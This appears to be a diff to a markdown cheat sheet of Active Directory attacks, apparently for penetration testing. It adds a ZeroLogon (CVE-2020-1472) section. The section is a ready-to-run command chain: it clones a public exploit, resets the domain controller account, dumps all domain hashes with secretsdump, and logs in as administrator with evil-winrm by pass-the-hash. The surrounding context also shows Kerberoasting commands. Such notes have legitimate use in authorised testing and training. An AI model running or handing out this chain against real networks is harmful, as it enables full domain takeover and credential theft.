@@ -109,6 +109,15 @@ Send request to TGS and extract the hash:
 impacket-GetUserSPNs -dc-ip $TARGET_IP $TARGET_DOMAIN/$USERNAME -request
 ```
 
+
+ZeroLogon (CVE-2020-1472)
+---
+```bash
+git clone https://github.com/dirkjanm/CVE-2020-1472
+python3.11 cve-2020-1472-exploit.py $NB_NAME $TARGET_IP
+impacket-secretsdump -no-pass -just-dc $NB_NAME\$@$TARGET_IP\
+evil-winrm -u administrator -i $TARGET_IP -H $HASH
+```
 Overpass the hash attack
 ---
 (when NTLM protocol is disabled):
